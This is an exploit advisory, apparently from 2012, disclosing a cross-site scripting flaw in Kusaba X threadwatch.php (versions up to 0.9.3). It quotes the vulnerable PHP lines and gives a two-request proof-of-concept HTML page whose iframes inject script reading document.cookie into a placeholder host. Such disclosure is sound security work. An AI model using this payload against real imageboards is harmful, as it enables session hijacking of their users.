#################################
#	Kusaba X <= 0.9.3 XSS	#
#################################
# APP: Kusaba X 
# Software Link: http://kusabax.cultnet.net/
# Affected versions: <= 0.9.3
# Date: 07.09.2012
# Exploit Author: vammm (vammm.wordpress.com)

#
# threadwatch.php, line 50:
#   $tc_db->Execute("INSERT INTO `" . KU_DBPREFIX . "watchedthreads` ( `threadid` , `board` , `ip` , `lastsawreplyid` ) VALUES ( " . $tc_db->qstr($_GET['threadid']) . " , " . $tc_db->qstr($_GET['board']) . " , '" . $_SERVER['REMOTE_ADDR'] . "' , " . $newestreplyid . " )");
#
# threadwatch.php, line 90:
# $output .= ' <a title="Un-watch" onclick="javascript:removefromwatchedthreads(\'' . $watched_thread['threadid'] . '\', \'' . $_GET['board'] . '\');return false;" href="#">X</a>';
#
# The page threadwatch.php allows anything to be inserted into the table watchedthreads, showing the content from it.
# So, you will need two requests to exploit it.
#
 
<script>
	function exploit(){
		document.getElementById('exploit').src = "http://vulnerable/threadwatch.php?o=addthread&board=%5C')%3B%22%3E%3C%2Fa%3E%3Cscript%3Ealert(document.cookie)%3B%2F*a*%2F%3C%2Fscript%3E%3C!--";
	}
</script>

<iframe src="http://vulnerable/threadwatch.php?do=addthread&board=%5C')%3B%22%3E%3C%2Fa%3E%3Cscript%3Ealert(document.cookie)%3B%2F*a*%2F%3C%2Fscript%3E%3C!--" onload="exploit()"></iframe>
<iframe src="" id="exploit"></iframe>


